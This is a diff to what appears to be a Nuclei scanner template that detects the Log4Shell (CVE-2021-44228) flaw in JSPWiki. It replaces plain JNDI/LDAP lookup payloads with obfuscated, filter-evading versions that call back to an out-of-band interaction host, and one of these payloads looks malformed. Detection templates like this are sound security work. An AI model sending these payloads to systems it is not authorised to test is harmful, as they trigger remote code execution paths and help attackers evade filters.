@@ -11,13 +11,15 @@ info:
     - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
   tags: cve,cve2021,rce,oast,log4j
 
+#${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/
+
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/wiki/$%7Bjndi:ldap:$%7B::-/%7D/{{Host}}.{{interactsh-url}}%7D/"
-      - "{{BaseURL}}/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/{{Host}}.{{interactsh-url}}%7D/"
-      - "{{BaseURL}}/wiki/$%7bjndi:ldap:%2f%2f127.0.0.1%23{{Host}}.{{interactsh-url}}%7d"
-      - "{{BaseURL}}/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1%23{{Host}}.{{interactsh-url}}%7D/"
+      - "{{BaseURL}}/wiki/$%7B$%7B:,:[:-j%7D$%7B:]:-n%7D$%7B:@:-d%7D$%7B::-i%7D:$%7B:):-l%7D$%7B:":-d%7D$%7B:Chrome:-a%7D$%7B:Mozilla:-p%7D:$%7B:":-/%7D/{{Host}}.{{interactsh-url}}/(%7D/"
+      - "{{BaseURL}}/JSPWiki/wiki/$%7B$%7B:,:[:-j%7D$%7B:]:-n%7D$%7B:@:-d%7D$%7B::-i%7D:$%7B:):-l%7D$%7B:":-d%7D$%7B:Chrome:-a%7D$%7B:Mozilla:-p%7D:$%7B:":-/%7D/{{Host}}.{{interactsh-url}}/(%7D/"
+      - "{{BaseURL}}/wiki/$%7B$%7B:,:[:-j%7D$%7B:]:-n%7D$%7B:@:-d%7D$%7B::-i%7D:$%7B:):-l%7Ddap:%2f%2f127.0.0.1%23{{Host}}.{{interactsh-url}}/(%7d"
+      - "{{BaseURL}}/JSPWiki/wiki/$%7B$%7B:,:[:-j%7D$%7B:]:-n%7D$%7B:@:-d%7D$%7B::-i%7D:$%7B:):-l%7D$%7B:":-d%7D$%7B:Chrome:-a%7D$%7B:Mozilla:-p%7D:$%7B:":-/%7D/127.0.0.1%23{{Host}}.{{interactsh-url}}/(%7D/"
     headers:
        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
 
